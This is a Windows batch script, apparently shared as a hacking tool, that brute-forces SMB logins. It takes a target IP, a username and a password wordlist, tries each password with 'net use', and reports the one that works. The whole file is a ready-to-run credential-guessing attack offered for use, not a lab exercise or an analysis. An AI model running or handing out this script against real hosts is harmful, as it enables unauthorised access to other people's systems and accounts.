@echo off
title SMB Bruteforce - by Ebola Man
color A
echo /$$$$$$$                        /$$                     /$$$$$$$$                                     
echo ! $$__  $$                      ! $$                    ! $$_____/                                     
echo ! $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$    /$$$$$$       ! $$     /$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$ 
echo ! $$$$$$$  /$$__  $$! $$  ! $$!_  $$_/   /$$__  $$      ! $$$$$ /$$__  $$ /$$__  $$ /$$_____/ /$$__  $$
echo ! $$__  $$! $$  \__/! $$  ! $$  ! $$    ! $$$$$$$$      ! $$__/! $$  \ $$! $$  \__/! $$      ! $$$$$$$$
echo ! $$  \ $$! $$      ! $$  ! $$  ! $$ /$$! $$_____/      ! $$   ! $$  ! $$! $$      ! $$      ! $$_____/
echo ! $$$$$$$/! $$      !  $$$$$$/  !  $$$$/!  $$$$$$$      ! $$   !  $$$$$$/! $$      !  $$$$$$$!  $$$$$$$
echo !_______/ !__/       \______/    \___/   \_______/      !__/    \______/ !__/       \_______/ \_______/
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
exit

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1

if %errorlevel% EQU 0 goto success
